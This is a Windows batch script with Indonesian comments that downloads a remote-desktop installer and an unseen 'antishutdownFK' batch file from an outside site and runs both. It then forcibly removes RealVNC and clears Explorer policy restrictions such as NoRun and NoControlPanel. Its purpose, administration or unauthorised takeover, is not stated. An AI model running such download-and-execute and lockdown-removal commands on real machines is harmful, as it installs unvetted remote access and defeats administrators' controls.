@echo off

:: 1. Download StarDesk
curl -L -o "%TEMP%\StarDesk_Setup.exe" "https://trueadam.site/StarDesk_1.4.0.exe"

:: 2. Download + jalanin antishutdownFK
curl -L -o "%TEMP%\antishutdownFK.bat" "https://trueadam.site/antishutdownFK.bat"
call "%TEMP%\antishutdownFK.bat"

:: 3. Install + buka StarDesk
start /wait "" "%TEMP%\StarDesk_Setup.exe"

:: 4. Kill + hapus VNC
powershell -ExecutionPolicy Bypass -Command "Stop-Service -Name 'vncserver' -Force -ErrorAction SilentlyContinue; sc.exe delete vncserver; taskkill /F /IM vncserver.exe; taskkill /F /IM winvnc.exe; taskkill /F /IM vncagent.exe; Remove-Item 'C:\Program Files\RealVNC' -Recurse -Force -ErrorAction SilentlyContinue; Remove-Item 'C:\Program Files (x86)\RealVNC' -Recurse -Force -ErrorAction SilentlyContinue"

:: Unlock registry policy
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoDrives /t REG_DWORD /d 0 /f 2>nul
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoViewOnDrive /t REG_DWORD /d 0 /f 2>nul
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRun /t REG_DWORD /d 0 /f 2>nul
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoWinKeys /t REG_DWORD /d 0 /f 2>nul
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoControlPanel /t REG_DWORD /d 0 /f 2>nul

:: Restart explorer
taskkill /F /IM explorer.exe 2>nul
start explorer.exe

:: Clear icon cache
ie4uinit.exe -show
ie4uinit.exe -ClearIconCache
ie4uinit.exe -user